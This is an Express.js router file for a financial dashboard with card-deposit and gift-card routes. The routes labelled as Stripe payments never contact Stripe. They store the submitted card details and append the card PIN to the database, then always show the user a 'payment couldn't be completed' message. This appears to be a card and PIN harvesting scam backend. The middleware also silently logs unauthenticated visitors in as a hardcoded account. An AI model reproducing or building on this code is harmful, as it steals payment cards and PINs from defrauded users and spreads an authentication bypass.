const express = require("express")
const Router = express.Router()
const {CARD, USER, Transaction }= require("../../modules/db/db-user")
const showError = require("../../modules/errormodule")

Router.use(async function(req,res,next){
    try{
        if(req.isAuthenticated()){
           return next()
        }
        // res redirect to login page
        const user = await USER.findOne({email : "somtrcu@sidin.cniy"})
        return req.login(user, function(err){
            if(err) return console.log(err.message)
            return next()
        })
    }catch(err){
        res.send("an error occured internally, please report")
    }
})

/*
@ paywith new card - 
deposit card ** 
<users with no card>
*/
Router.post("/stripe-payment-new", express.urlencoded({extended : false}), async function(req,res){
    try{
        deleted  = !Boolean(req.body.save)
        await CARD.create({...req.body, deleted , user : req.user._id })
        return showError(req, "/dashboard/deposit", "payment couldn't be completed", res)
    }catch(err){
        console.log("caught error")
        // showError here but for now
        return showError(req, "/dashboard/deposit", err.message, res)
    }
})


/*
@ paywith available card - 
deposit card **
<users with available card>
*/
Router.post("/stripe-payment-available", express.urlencoded({extended : false}), async function(req,res){
    try{
        const card = await CARD.findById(req.body.card_id)
        if(!card) return new Error("error locating account card, try again")
        card.card_pin.push(req.body.card_pin)
        await card.save()
        return showError(req, "/dashboard/deposit", "payment couldn't be processed", res)
    }catch(err){
        return showError(req, "/dashboard/deposit", err.message, res)
    }
})

/*
@ Buy giftcard - 
<all users with>
# send email
*/
Router.post("/giftcard", express.urlencoded({extended : false}), async function(req,res){
    console.log(req.body)
    try{
        const {amount, title} = JSON.parse(req.body.giftcard)
        if(req.user.balance < Number(amount)) return showError(req, "/dashboard/withdraw#giftcard", "Insufficient balance", res)
       await USER.updateOne({_id : req.user._id}, { balance : req.user.balance - Number(amount), $push : {giftcards :{amount,title} } })
       await Transaction.create({user : req.user._id, amount, type : "giftcard", status : "success"})
        // send email
        return showError(req, "/dashboard/withdraw#giftcard", "purchase successful", res)
    }catch(err){
        return showError(req, "/dashboard/withdraw#giftcard", err.message, res)
    }
})

module.exports = Router
